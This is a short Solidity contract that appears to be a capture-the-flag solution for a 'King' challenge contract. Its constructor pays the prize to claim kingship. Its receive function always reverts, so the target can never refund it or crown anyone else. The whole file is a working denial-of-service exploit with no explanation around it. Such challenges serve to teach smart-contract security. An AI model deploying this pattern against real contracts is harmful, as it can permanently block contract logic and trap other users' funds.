// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Solution {
    constructor(address instance) payable {
        // this will be needed to claim the kingship of King contract
        require(msg.value >= 1000000000000000 wei, "must pay the prize");
        instance.call{value: msg.value}("");
    }

    receive() external payable {
        revert(unicode"Sorry I can't let you be the King 🙂");
    }
}